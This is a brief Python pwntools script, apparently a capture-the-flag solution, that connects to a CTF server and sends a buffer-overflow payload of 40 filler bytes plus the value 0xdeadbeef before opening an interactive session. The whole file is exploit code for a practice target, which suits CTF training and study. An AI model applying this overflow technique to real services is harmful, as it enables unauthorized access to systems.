from pwn import*

p = remote("ctf.j0n9hyun.xyz",3000)
v5 = 0xdeadbeef

payload = "a"*40 + p32(v5)

p.sendline(payload)
p.interactive()
